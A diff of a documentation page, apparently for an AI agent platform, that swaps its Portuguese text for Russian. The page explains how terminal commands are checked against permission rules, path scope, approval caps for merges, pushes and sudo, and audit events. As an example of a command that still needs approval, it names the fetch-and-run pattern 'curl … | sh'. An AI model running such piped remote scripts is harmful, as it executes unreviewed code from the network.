-para um padrão (<a href=/brabo/dev/ru/business-rules#rn-509 target=_blank rel="noopener noreferrer" class="">RN-509</a>).</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=path-scope>Escopo de caminho<a href=#path-scope class=hash-link aria-label="Прямая ссылка на Escopo de caminho" title="Прямая ссылка на Escopo de caminho" translate=no>​</a></h2>
-<p>Um comando de <code>terminal</code> é avaliado também por <strong>onde ele toca</strong>, não só pelo
-verbo (<a href=/brabo/dev/ru/adr/0055-escopo-de-caminho-na-politica-de-terminal target=_blank rel="noopener noreferrer" class="">ADR 0055</a>,
-<a href=/brabo/dev/ru/business-rules/custo#rn-075 target=_blank rel="noopener noreferrer" class="">RN-075</a>). A pasta do projeto —
-<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>, onde moram o
-<code>permissions.json</code> e todos os worktrees dos agentes — é o <strong>escopo</strong>.
+<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> и
+<code>raise_max_parallel</code> — <code>400</code> с <code>reason: "teto_do_sempre_permitir"</code>. Карточка
+одобрения скрывает кнопку для того же списка (копия, сверяемая с этим тестом).
+Когда это появилось, оно НЕ изменило ни <code>decide()</code>, ни то, что засевает
+активация исполнения; начиная с <a class="" href=/brabo/dev/ru/business-rules#rn-689>RN-689</a> оба
+изменились: <code>git_push</code> и <code>pr_open</code> находятся внутри предела RN-418 в <code>decide()</code>
+(см. <a href=#caps class="">«Пределы»</a>), а активация исполнения засевает только <code>git_commit</code>
+как <code>auto_approve</code> для каждого <code>dev-&lt;modulo></code>.</p>
+<p><strong>Единица записываемого шаблона: глагол + подкоманда, по одному на сегмент
+(<a class="" href=/brabo/dev/ru/business-rules#rn-675>RN-675</a>, решение владельца от 01/10).</strong> «Всегда
+разрешать» больше не записывает команду целиком байт в байт: каждый сегмент
+команды (разделённой по <code>&&</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&</code>, так же, как её делит
+<code>decide()</code>) становится шаблоном — глагол плюс подкоманда, когда второй токен —
+слово (<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), глагол отдельно,
+когда это аргумент, не являющийся словом (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
+<code>cd ../lib</code> → <code>Terminal(cd)</code>), и ТОЧНЫЙ сегмент, когда второй токен — флаг
+(<code>ls -la src</code>) или когда единица была бы префиксом предела RN-418
+(<code>git remote -v</code>, <code>gh pr list</code> остаются точными). Сегмент, который является
+префиксом предела даже в точном виде (<code>git</code> отдельно), ничего не записывает.
+<code>cd src/app && npm test</code> записывает <code>Terminal(cd)</code> и <code>Terminal(npm test)</code>, и
+следующий <code>cd lib/core && npm test -- --coverage</code> выполняется без вопроса.
+Сопоставление по-прежнему по префиксу токенов, пределы по-прежнему работают
+после файла в <code>decide()</code>, а область путей по-прежнему действует вне
+автоматического режима. Нажатие dev agent модуля по-прежнему идёт в
+<code>agent_autonomy</code>, а не в шаблон (<a class="" href=/brabo/dev/ru/business-rules#rn-509>RN-509</a>).</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=path-scope>Область путей<a href=#path-scope class=hash-link aria-label="Прямая ссылка на Область путей" title="Прямая ссылка на Область путей" translate=no>​</a></h2>
+<p>Команда <code>terminal</code> оценивается также по тому, <strong>чего она касается</strong>, а не
+только по глаголу (<a class="" href=/brabo/dev/ru/adr/0055-escopo-de-caminho-na-politica-de-terminal>ADR 0055</a>,
+<a class="" href=/brabo/dev/ru/business-rules/custo#rn-075>RN-075</a>). Папка проекта —
+<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>, где живут
+<code>permissions.json</code> и все worktree агентов, — это <strong>область</strong>.
 <code>workspace_dir_name</code>
-(<a href=/brabo/dev/ru/adr/0066-nome-de-pasta-legivel-do-workspace target=_blank rel="noopener noreferrer" class="">ADR 0066</a>,
-<a href=/brabo/dev/ru/business-rules/autenticacao#rn-109 target=_blank rel="noopener noreferrer" class="">RN-109</a>) é o nome da pasta
-congelado na criação do projeto — legível (<code>&lt;slug>-&lt;8 caracteres do id></code>) num
-projeto novo, o UUID puro num projeto de antes dessa mudança.</p>
-<p><strong>Um projeto em modo <code>local</code> tem um escopo diferente, e a diferença importa
-aqui</strong> (<a href=/brabo/dev/ru/adr/0072-projeto-local-ou-container target=_blank rel="noopener noreferrer" class="">ADR 0072</a>,
-<a href=/brabo/dev/ru/business-rules/autenticacao#rn-169 target=_blank rel="noopener noreferrer" class="">RN-169</a>/<a href=/brabo/dev/ru/business-rules/autenticacao#rn-170 target=_blank rel="noopener noreferrer" class="">RN-170</a>):
-a raiz passa a ser o <strong>caminho absoluto que o usuário digitou na criação</strong>, não
-<code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
-<p>Tudo o que esta seção descreve continua valendo — o escopo aperta e afrouxa
-exatamente do mesmo jeito, e <code>deny</code> continua vencendo primeiro. O que muda é o
-que ele CONTÉM. E a consequência é declarada sem atenuação no ADR 0072: a
-contenção <strong>estrutural</strong> do <code>join</code> — "o resultado nunca sai da raiz gerenciada,
-aconteça o que acontecer com a coluna" — deixa de existir para esses projetos.
-O que a substitui é a validação na criação (RN-170: absoluto, sem <code>..</code>,
-existente, gravável, nunca uma raiz de sistema, nunca sobreposto ao checkout do
-Brabo), mais a revalidação LÉXICA do mesmo predicado em toda derivação da raiz
-— para que uma linha adulterada direto no banco não vire um escopo de terminal
-em <code>/</code>.</p>
-<p>A comparação de caminho é <strong>léxica e sem regex sobre a entrada</strong>: aparar barras
-finais é uma varredura O(n), não <code>.replace(/\/+$/, '')</code>. O padrão antigo foi
-apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele força o motor a tentar
-toda posição inicial, e degrada para O(n²) com muitas barras. A entrada aqui
-vem de um comando de agente, então não é lugar para regex com backtracking.</p>
-<p>O escopo faz duas coisas opostas, e é a combinação que importa:</p>
-<p><strong>Aperta.</strong> Um comando que toca um caminho de fora nunca é auto-aprovado, por
-mais que o verbo esteja no <code>allow</code>. Sem isso, um <code>Terminal(cat)</code> permitido
-auto-executaria <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — o código da
-plataforma que roda o agente — e alcançaria os worktrees de outros projetos.</p>
-<p><strong>Afrouxa.</strong> Dentro do escopo, <code>cd</code> deixa de ser verbo que precisa de
-permissão: ele é a própria declaração do escopo. Sem isso, o dev agent, que
-sempre emite <code>cd &lt;caminho> && &lt;verbo></code>, esbarraria na regra do comando
-composto — todo segmento precisa casar — e <strong>todo</strong> comando pararia para
-aprovação, por mais que o verbo estivesse permitido.</p>
-<p>Três limites que vale entender:</p>
+(<a class="" href=/brabo/dev/ru/adr/0066-nome-de-pasta-legivel-do-workspace>ADR 0066</a>,
+<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-109>RN-109</a>) — имя папки,
+замороженное при создании проекта, — читаемое (<code>&lt;slug>-&lt;8 символов id></code>) в
+новом проекте, чистый UUID в проекте, созданном до этого изменения.</p>
+<p><strong>У проекта в режиме <code>local</code> другая область, и разница здесь важна</strong>
+(<a class="" href=/brabo/dev/ru/adr/0072-projeto-local-ou-container>ADR 0072</a>,
+<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-169>RN-169</a>/<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-170>RN-170</a>):
+корнем становится <strong>абсолютный путь, который пользователь ввёл при создании</strong>, а
+не <code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
+<p>Всё, что описывает этот раздел, по-прежнему действует — область сужает и
+расширяет точно так же, и <code>deny</code> по-прежнему побеждает первым. Меняется то, что
+она СОДЕРЖИТ. И последствие объявлено в ADR 0072 без смягчения:
+<strong>структурное</strong> сдерживание <code>join</code> — «результат никогда не выходит из
+управляемого корня, что бы ни случилось с колонкой» — для таких проектов
+перестаёт существовать. Его заменяет проверка при создании (RN-170:
+абсолютный, без <code>..</code>, существующий, доступный для записи, никогда не системный
+корень, никогда не перекрывающий checkout Brabo), плюс ЛЕКСИЧЕСКАЯ повторная
+проверка того же предиката при каждом выводе корня — чтобы строка, подделанная
+прямо в базе, не превратилась в область terminal в <code>/</code>.</p>
+<p>Сравнение путей <strong>лексическое и без regex над входом</strong>: обрезка конечных
+слэшей — это проход O(n), а не <code>.replace(/\/+$/, '')</code>. Старый шаблон CodeQL
+отметил как полиномиальный ReDoS (HIGH) — он заставляет движок пробовать
+каждую начальную позицию и деградирует до O(n²) при множестве слэшей. Вход
+здесь приходит из команды агента, так что это не место для regex с
+backtracking.</p>
+<p>Область делает две противоположные вещи, и важна их комбинация:</p>
+<p><strong>Сужает.</strong> Команда, касающаяся внешнего пути, никогда не автоодобряется, как
+бы глагол ни был в <code>allow</code>. Без этого разрешённый <code>Terminal(cat)</code>
+автоматически выполнил бы <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — код платформы,
+на которой работает агент, — и добрался бы до worktree других проектов.</p>
+<p><strong>Расширяет.</strong> Внутри области <code>cd</code> перестаёт быть глаголом, требующим
+разрешения: он сам является объявлением области. Без этого dev agent, который
+всегда выдаёт <code>cd &lt;путь> && &lt;глагол></code>, упёрся бы в правило составной
+команды — каждый сегмент должен совпасть — и <strong>каждая</strong> команда
+останавливалась бы на одобрение, как бы глагол ни был разрешён.</p>
+<p>Три ограничения, которые стоит понять:</p>
 <ul>
-<li class=""><strong>Escopo permite, não isenta.</strong> Estar na pasta do projeto não torna
-<code>curl … | sh</code> seguro: um verbo fora do <code>allow</code> continua exigindo aprovação.</li>
-<li class=""><strong>Fora do escopo é <code>require_approval</code>, não <code>deny</code>.</strong> O agente pode ter um
-motivo legítimo para olhar fora; quem decide continua sendo você.</li>
-<li class=""><strong>O modo automático pula este teto.</strong> Um agente com a curinga
-<code>"*": auto_approve</code> roda comandos fora do escopo sem perguntar
-(<a href=/brabo/dev/ru/business-rules/autenticacao#rn-603 target=_blank rel="noopener noreferrer" class="">RN-603</a>); voltar o card do
-agente para "manual" o restaura.</li>
-<li class=""><strong>A normalização é léxica, não <code>realpath</code>.</strong> <code>&lt;raiz>/../..</code> é resolvido e
-rejeitado; um link simbólico dentro do projeto apontando para fora <strong>não</strong> é
-detectado. Escopo é política, não isolamento.</li>
+<li class=""><strong>Область разрешает, но не освобождает.</strong> Нахождение в папке проекта не
+делает <code>curl … | sh</code> безопасным: глагол вне <code>allow</code> по-прежнему требует
+одобрения.</li>
+<li class=""><strong>Вне области — <code>require_approval</code>, а не <code>deny</code>.</strong> У агента может быть
+законная причина посмотреть наружу; решаете по-прежнему вы.</li>
+<li class=""><strong>Автоматический режим пропускает этот предел.</strong> Агент с подстановочным знаком
+<code>"*": auto_approve</code> выполняет команды вне области без вопроса
+(<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-603>RN-603</a>); возврат карточки
+агента в «manual» восстанавливает его.</li>
+<li class=""><strong>Нормализация лексическая, а не <code>realpath</code>.</strong> <code>&lt;корень>/../..</code> разрешается и
+отклоняется; символическая ссылка внутри проекта, указывающая наружу, <strong>не</strong>
+обнаруживается. Область — это политика, а не изоляция.</li>
 </ul>
-<p>Quais tokens são conferidos: os <strong>absolutos</strong> (começam com <code>/</code>) e os que
-contêm <code>..</code>. Um relativo sem <code>..</code> resolve abaixo do <code>cwd</code>, que já foi conferido
-— e tratar <code>-maxdepth</code>, <code>4</code> ou <code>*.ex</code> como caminho rejeitaria um comando
-legítimo sem ganhar segurança nenhuma.</p>
-<p>Duas propriedades que decorrem disto:</p>
-<p><strong><code>deny</code> vence na hora.</strong> Não importa em que etapa apareça, ele devolve na
-hora. Não há configuração que reverta um <code>deny</code>.</p>
-<p><strong>Etapa calada nunca rebaixa.</strong> Se o <code>agent_autonomy</code> disse <code>auto_approve</code> e o
-<code>permissions.json</code> não tem regra para aquela ação, o resultado continua
-<code>auto_approve</code> — o arquivo não "vota contra" por omissão. Cada etapa só pode
-subir a permissividade da anterior.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=caps>Tetos<a href=#caps class=hash-link aria-label="Прямая ссылка на Tetos" title="Прямая ссылка на Tetos" translate=no>​</a></h2>
-<p>Aplicados <strong>por último</strong>, depois de todo o resto:</p>
+<p>Какие токены проверяются: <strong>абсолютные</strong> (начинаются с <code>/</code>) и содержащие
+<code>..</code>. Относительный без <code>..</code> разрешается ниже <code>cwd</code>, который уже проверен, —
+а считать <code>-maxdepth</code>, <code>4</code> или <code>*.ex</code> путём значило бы отклонять законную
+команду, не выигрывая никакой безопасности.</p>
+<p>Два свойства, вытекающие из этого:</p>
+<p><strong><code>deny</code> побеждает сразу.</strong> Неважно, на каком этапе он появился, он возвращается
+сразу. Нет настройки, которая отменила бы <code>deny</code>.</p>
+<p><strong>Молчащий этап никогда не понижает.</strong> Если <code>agent_autonomy</code> сказал
+<code>auto_approve</code>, а в <code>permissions.json</code> нет правила для этого действия,
+результат остаётся <code>auto_approve</code> — файл не «голосует против» умолчанием.
+Каждый этап может лишь повысить разрешительность предыдущего.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=caps>Пределы<a href=#caps class=hash-link aria-label="Прямая ссылка на Пределы" title="Прямая ссылка на Пределы" translate=no>​</a></h2>
+<p>Применяются <strong>последними</strong>, после всего остального:</p>
 
 
 
@@ -644,63 +658,63 @@ subir a permissividade da anterior.</p>
 
 
 
-<table><thead><tr><th>teto<th>efeito<th>por quê<tbody><tr><td><code>git_merge</code> com destino em <code>dev</code>, <code>qa</code>, <code>rc</code> ou <code>main</code><td><code>auto_approve</code> → <code>require_approval</code><td>merge em branch protegida é sempre decisão sua (<a href=/brabo/dev/ru/business-rules#rn-006 target=_blank rel="noopener noreferrer" class="">RN-006</a>)<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>você precisa ver o diff antes de um agente mudar o comportamento de outro (<a href=/brabo/dev/ru/business-rules#rn-007 target=_blank rel="noopener noreferrer" class="">RN-007</a>)<tr><td><code>parallelize</code> e <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>gastar com mais agentes é decisão sua; sem este teto o limite do lead seria decorativo, e subir o próprio teto seria o produto subindo o próprio limite de gasto (<a href=/brabo/dev/ru/business-rules/custo#rn-086 target=_blank rel="noopener noreferrer" class="">RN-086</a>)<tr><td><code>terminal</code> com git de efeito externo (push/PR/deploy) ou <code>sudo</code>/<code>doas</code><td><code>auto_approve</code> → <code>require_approval</code><td>git com efeito externo e comandos privilegiados nunca são auto-aprováveis, nem com o "modo automático" ligado (<a href=/brabo/dev/ru/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>, revisa a <a href=/brabo/dev/ru/business-rules/autenticacao#rn-106 target=_blank rel="noopener noreferrer" class="">RN-106</a>) — veja a seção dedicada acima<tr><td><code>git_push</code> e <code>pr_open</code> tipados<td><code>auto_approve</code> → <code>require_approval</code><td>o mesmo teto da RN-418 pela porta tipada: nem a curinga do modo automático, nem uma regra específica de <code>agent_autonomy</code>, nem o <code>permissions.json</code> os promovem (<a href=/brabo/dev/ru/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a>). <code>git_merge</code> mantém o teto próprio (primeira linha); <code>deploy</code> não é tipo de <code>proposed_action</code><tr><td><code>container_remove</code><td><code>auto_approve</code> → <code>require_approval</code><td>descartar um container força um reprovisionamento completo — mesmo calibre de mergear em branch protegida, decidido toda vez, nunca configurado uma vez (<a href=/brabo/dev/ru/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>)</table>
-<p>Um teto rebaixa <code>auto_approve</code> para <code>require_approval</code>; ele <strong>não</strong> transforma
-<code>deny</code> em outra coisa, porque o <code>deny</code> já teria devolvido antes.</p>
-<p>:::note Por que <code>rc</code> continua na lista</p>
-<p>O degrau <code>rc</code> saiu da política de branches
-(<a href=/brabo/dev/ru/adr/0030-politica-de-branches-mecanizada target=_blank rel="noopener noreferrer" class="">ADR 0030</a>) e o bootstrap
-parou de criá-lo (<a href=/brabo/dev/ru/business-rules#rn-029 target=_blank rel="noopener noreferrer" class="">RN-029</a>) — mas ele continua
-aqui, em <code>domain/actions/protected-branches.ts</code>.</p>
-<p>Esta lista decide o que a trava de merge <strong>recusa</strong>, e repositórios
-bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
-não tiraria nada do repositório de ninguém: só tornaria auto-aprovável um
-<code>git_merge</code> com destino <code>rc</code>, numa branch que alguém pode estar usando como
-produção.</p>
-<p>Proteger uma branch que não existe não custa nada. Desproteger uma que existe
-custa caro — e a assimetria é deliberada.</p>
+<table><thead><tr><th>предел<th>эффект<th>почему<tbody><tr><td><code>git_merge</code> с целью в <code>dev</code>, <code>qa</code>, <code>rc</code> или <code>main</code><td><code>auto_approve</code> → <code>require_approval</code><td>merge в защищённую ветку — всегда ваше решение (<a class="" href=/brabo/dev/ru/business-rules#rn-006>RN-006</a>)<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>вам нужно увидеть diff, прежде чем один агент изменит поведение другого (<a class="" href=/brabo/dev/ru/business-rules#rn-007>RN-007</a>)<tr><td><code>parallelize</code> и <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>тратить на больше агентов — ваше решение; без этого предела лимит лида был бы декоративным, а поднятие собственного предела было бы продуктом, поднимающим собственный лимит расходов (<a class="" href=/brabo/dev/ru/business-rules/custo#rn-086>RN-086</a>)<tr><td><code>terminal</code> с git внешнего эффекта (push/PR/deploy) или <code>sudo</code>/<code>doas</code><td><code>auto_approve</code> → <code>require_approval</code><td>git с внешним эффектом и привилегированные команды никогда не автоодобряются, даже при включённом «автоматическом режиме» (<a class="" href=/brabo/dev/ru/business-rules#rn-418>RN-418</a>, пересматривает <a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-106>RN-106</a>) — см. отдельный раздел выше<tr><td>типизированные <code>git_push</code> и <code>pr_open</code><td><code>auto_approve</code> → <code>require_approval</code><td>тот же предел RN-418 через типизированную дверь: ни подстановочный знак автоматического режима, ни конкретное правило <code>agent_autonomy</code>, ни <code>permissions.json</code> их не повышают (<a class="" href=/brabo/dev/ru/business-rules#rn-689>RN-689</a>). <code>git_merge</code> сохраняет собственный предел (первая строка); <code>deploy</code> не является типом <code>proposed_action</code><tr><td><code>container_remove</code><td><code>auto_approve</code> → <code>require_approval</code><td>уничтожение контейнера вынуждает полное повторное развёртывание — тот же калибр, что и merge в защищённую ветку, решается каждый раз, никогда не настраивается раз и навсегда (<a class="" href=/brabo/dev/ru/business-rules#rn-495>RN-495</a>)</table>
+<p>Предел понижает <code>auto_approve</code> до <code>require_approval</code>; он <strong>не</strong> превращает
+<code>deny</code> во что-то другое, потому что <code>deny</code> уже вернулся бы раньше.</p>
+<p>:::note Почему <code>rc</code> остаётся в списке</p>
+<p>Ступень <code>rc</code> ушла из политики веток
+(<a class="" href=/brabo/dev/ru/adr/0030-politica-de-branches-mecanizada>ADR 0030</a>), и bootstrap
+перестал её создавать (<a class="" href=/brabo/dev/ru/business-rules#rn-029>RN-029</a>), — но она остаётся
+здесь, в <code>domain/actions/protected-branches.ts</code>.</p>
+<p>Этот список решает, что <strong>отклоняет</strong> блокировка merge, а в репозиториях,
+развёрнутых предыдущими версиями Brabo, эта ветка ещё есть. Убрать её отсюда
+ничего не убрало бы из чьего-либо репозитория: лишь сделало бы автоодобряемым
+<code>git_merge</code> с целью <code>rc</code>, в ветку, которую кто-то может использовать как
+продакшен.</p>
+<p>Защитить несуществующую ветку ничего не стоит. Снять защиту с существующей —
+дорого, и асимметрия намеренная.</p>
 <p>:::</p>
-<p>A diferença entre teto e padrão: o padrão é o que acontece quando ninguém
-configurou nada; o teto é o que acontece <strong>independentemente</strong> do que foi
-configurado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem>O que acontece com o agente enquanto a decisão não vem<a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class=hash-link aria-label="Прямая ссылка на O que acontece com o agente enquanto a decisão não vem" title="Прямая ссылка на O que acontece com o agente enquanto a decisão não vem" translate=no>​</a></h2>
-<p>Uma ação <code>pending</code> não é só uma linha esperando um clique: do outro lado há um
-agente parado.</p>
-<p>Quando a ferramenta que ele chamou fica pendente, o laço dele <strong>suspende</strong>,
-segurando a tarefa, o worktree e o histórico da conversa, e ele entra em
-<code>awaiting_approval</code>. A sua decisão emite <code>task.action_settled</code>, que o acorda:
-o resultado real do comando ocupa o lugar onde estaria a resposta, e o laço
-retoma de onde parou.</p>
-<p><strong>Recusar também responde.</strong> O motivo ocupa o lugar do resultado, e o agente
-aprende que aquele caminho está fechado em vez de esperar para sempre — negar
-não o deixa travado.</p>
-<p>Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já
-feito, e a fila de aprovação não é assíncrona por conveniência — ela é
-literalmente o que o agente está esperando. Antes disso, <code>pending</code> voltava
-como se fosse a resposta do comando, e o agente queimava o teto de iterações
-tentando outra coisa até a tarefa morrer sem uma linha escrita
-(<a href=/brabo/dev/ru/business-rules/custo#rn-073 target=_blank rel="noopener noreferrer" class="">RN-073</a>).</p>
-<p><strong>Com uma exceção: reinício do engine.</strong> O laço suspenso mora em memória,
-então um reinício o derruba junto. Nesse caso a tarefa <strong>não</strong> fica esperando:
-ela volta para a fila de bloqueadas, com o motivo e origem <code>infra</code> no event
-log, e uma decisão tomada depois disso não tem mais onde ser aplicada — a ação
-decidida fica registrada, mas o turno que a esperava não existe mais. Se você
-aprovou e nada aconteceu, este é o primeiro lugar a olhar.</p>
-<p>A auto-aprovação não passa por aqui: ela executa na proposta e o resultado
-volta no mesmo turno — que é exatamente o valor de ter os padrões da seção
-anterior.</p>
-<p><strong>O Dev Lead suspende do mesmo jeito, com uma diferença no reinício</strong>
-(ADR 0086, <a href=/brabo/dev/ru/business-rules#rn-284 target=_blank rel="noopener noreferrer" class="">RN-284</a>). Ele é conversacional, não
-tem worktree nem tarefa — o que suspende é o <code>handle_call</code> síncrono do turno,
-via <code>agent.status: awaiting_approval</code>. Diferente do dev agent, ele NÃO tem fila
-para onde voltar num reinício do engine: a decisão continua registrada e
-visível em Aprovações, mas o Dev Lead não narra o desfecho sozinho — o processo
-que esperava morreu, e o próximo reinício sobe um Dev Lead novo, sem inscrição
-para aquela ação. Uma lacuna aceita e declarada, não disfarçada.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-é-gravado-em-cada-decisão>O que é gravado em cada decisão<a href=#o-que-é-gravado-em-cada-decisão class=hash-link aria-label="Прямая ссылка на O que é gravado em cada decisão" title="Прямая ссылка на O que é gravado em cada decisão" translate=no>​</a></h2>
-<p>Toda ação proposta e toda decisão sobre ela viram um <strong>evento de domínio</strong> em
-<code>session_events</code>, com o ator real
-(<a href=/brabo/dev/ru/business-rules/custo#rn-049 target=_blank rel="noopener noreferrer" class="">RN-049</a>):</p>
+<p>Разница между пределом и умолчанием: умолчание — это то, что происходит, когда
+никто ничего не настроил; предел — то, что происходит <strong>независимо</strong> от того,
+что настроено.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=что-происходит-с-агентом-пока-решения-нет>Что происходит с агентом, пока решения нет<a href=#что-происходит-с-агентом-пока-решения-нет class=hash-link aria-label="Прямая ссылка на Что происходит с агентом, пока решения нет" title="Прямая ссылка на Что происходит с агентом, пока решения нет" translate=no>​</a></h2>
+<p>Действие <code>pending</code> — не просто строка, ожидающая нажатия: на другой стороне
+стоит остановленный агент.</p>
+<p>Когда вызванный им инструмент оказывается в ожидании, его цикл
+<strong>приостанавливается</strong>, удерживая задачу, worktree и историю разговора, и он
+переходит в <code>awaiting_approval</code>. Ваше решение выпускает <code>task.action_settled</code>,
+которое его будит: реальный результат команды занимает место, где был бы ответ,
+и цикл продолжается с того места, где остановился.</p>
+<p><strong>Отказ тоже отвечает.</strong> Причина занимает место результата, и агент узнаёт, что
+этот путь закрыт, вместо того чтобы ждать вечно, — отказ не оставляет его
+застрявшим.</p>
+<p>Это важно для оператора: позднее одобрение не тратит впустую уже сделанную
+работу, а очередь одобрения не асинхронна ради удобства — это буквально то,
+чего ждёт агент. Раньше <code>pending</code> возвращался так, будто это ответ команды, и
+агент сжигал предел итераций, пробуя что-то другое, пока задача не умирала без
+единой написанной строки (<a class="" href=/brabo/dev/ru/business-rules/custo#rn-073>RN-073</a>).</p>
+<p><strong>С одним исключением: перезапуск engine.</strong> Приостановленный цикл живёт в
+памяти, поэтому перезапуск роняет его вместе с собой. В этом случае задача
+<strong>не</strong> остаётся в ожидании: она возвращается в очередь заблокированных, с
+причиной и источником <code>infra</code> в event log, и решение, принятое после этого,
+больше негде применить — решённое действие остаётся записанным, но ход, который
+его ждал, больше не существует. Если вы одобрили и ничего не произошло, это
+первое место, куда стоит посмотреть.</p>
+<p>Автоодобрение здесь не проходит: оно выполняется при предложении, и результат
+возвращается в том же ходе — в этом и ценность шаблонов из предыдущего
+раздела.</p>
+<p><strong>Dev Lead приостанавливается так же, с одним отличием при перезапуске</strong>
+(ADR 0086, <a class="" href=/brabo/dev/ru/business-rules#rn-284>RN-284</a>). Он разговорный, у него нет
+ни worktree, ни задачи — приостанавливается синхронный <code>handle_call</code> хода,
+через <code>agent.status: awaiting_approval</code>. В отличие от dev agent, у него НЕТ
+очереди, куда вернуться при перезапуске engine: решение остаётся записанным и
+видимым в Одобрениях, но Dev Lead не сообщает исход сам — процесс, который
+ждал, умер, а следующий перезапуск поднимает новый Dev Lead без подписки на это
+действие. Принятый и объявленный пробел, а не замаскированный.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=что-записывается-при-каждом-решении>Что записывается при каждом решении<a href=#что-записывается-при-каждом-решении class=hash-link aria-label="Прямая ссылка на Что записывается при каждом решении" title="Прямая ссылка на Что записывается при каждом решении" translate=no>​</a></h2>
+<p>Каждое предложенное действие и каждое решение по нему становятся <strong>доменным
+событием</strong> в <code>session_events</code>, с реальным актором
+(<a class="" href=/brabo/dev/ru/business-rules/custo#rn-049>RN-049</a>):</p>
 
 
 
@@ -736,37 +750,38 @@ para aquela ação. Uma lacuna aceita e declarada, não disfarçada.</p>
 
 
 
-<table><thead><tr><th>evento<th>ator<th>quando<tbody><tr><td><code>proposed_action.created</code><td>o <strong>agente</strong> que a propôs<td>sempre, antes de qualquer execução. <code>payload.status</code> diz como a ação nasceu: <code>pending</code>, <code>auto_approved</code> ou <code>denied</code>; <code>payload.reason</code> diz qual regra de <code>decide()</code> a produziu (<a href=/brabo/dev/ru/business-rules#rn-567 target=_blank rel="noopener noreferrer" class="">RN-567</a>)<tr><td><code>proposed_action.approved</code><td>o <strong>usuário</strong> que clicou<td>só na aprovação manual (inclusive <code>approve_always</code>)<tr><td><code>permission.granted</code><td>o <strong>usuário</strong> que clicou em "sempre permitir"<td>só quando o clique gravou de fato um padrão — <code>payload.patterns</code> (os padrões gravados, um por segmento, <a href=/brabo/dev/ru/business-rules#rn-675 target=_blank rel="noopener noreferrer" class="">RN-675</a>) e <code>payload.pattern</code> (a mesma lista unida por ", "), ou <code>payload.agentId</code>/<code>actionType</code> para um dev agent de módulo (<a href=/brabo/dev/ru/business-rules#rn-642 target=_blank rel="noopener noreferrer" class="">RN-642</a>)<tr><td><code>proposed_action.denied</code><td>o <strong>usuário</strong> que recusou<td>com <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>desfecho da execução</table>
-<p>Daí sai o único jeito confiável de separar as duas coisas que este documento
-descreve:</p>
+<table><thead><tr><th>событие<th>актор<th>когда<tbody><tr><td><code>proposed_action.created</code><td><strong>агент</strong>, который его предложил<td>всегда, до любого выполнения. <code>payload.status</code> говорит, как родилось действие: <code>pending</code>, <code>auto_approved</code> или <code>denied</code>; <code>payload.reason</code> говорит, какое правило <code>decide()</code> его произвело (<a class="" href=/brabo/dev/ru/business-rules#rn-567>RN-567</a>)<tr><td><code>proposed_action.approved</code><td><strong>пользователь</strong>, который нажал<td>только при ручном одобрении (включая <code>approve_always</code>)<tr><td><code>permission.granted</code><td><strong>пользователь</strong>, нажавший «всегда разрешать»<td>только когда нажатие действительно записало шаблон — <code>payload.patterns</code> (записанные шаблоны, по одному на сегмент, <a class="" href=/brabo/dev/ru/business-rules#rn-675>RN-675</a>) и <code>payload.pattern</code> (тот же список, объединённый через ", "), или <code>payload.agentId</code>/<code>actionType</code> для dev agent модуля (<a class="" href=/brabo/dev/ru/business-rules#rn-642>RN-642</a>)<tr><td><code>proposed_action.denied</code><td><strong>пользователь</strong>, который отклонил<td>с <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>исход выполнения</table>
+<p>Отсюда единственный надёжный способ разделить две вещи, которые описывает этот
+документ:</p>
 <ul>
-<li class=""><strong>decisão humana</strong> = contar eventos <code>proposed_action.approved</code>;</li>
-<li class=""><strong>decisão de política</strong> = <code>proposed_action.created</code> com <code>status: auto_approved</code> e ator agente. Ela nunca produz um <code>.approved</code>, e por isso
-nunca se confunde com um clique. O <code>reason</code> dela diz <strong>qual</strong> regra
-auto-aprovou — <code>agent_autonomy: auto_approve</code>, uma linha <code>allow</code> do
-<code>permissions.json</code>, o piso do container, <code>escopo: cd dentro da pasta do projeto</code> — no texto exato que <code>decide()</code> usa. Eventos gravados antes da
-<a href=/brabo/dev/ru/business-rules#rn-567 target=_blank rel="noopener noreferrer" class="">RN-567</a> não têm <code>reason</code>: leia isso como "não
-registrado", não como "nenhuma regra". O motivo nomeia a regra, não a raiz
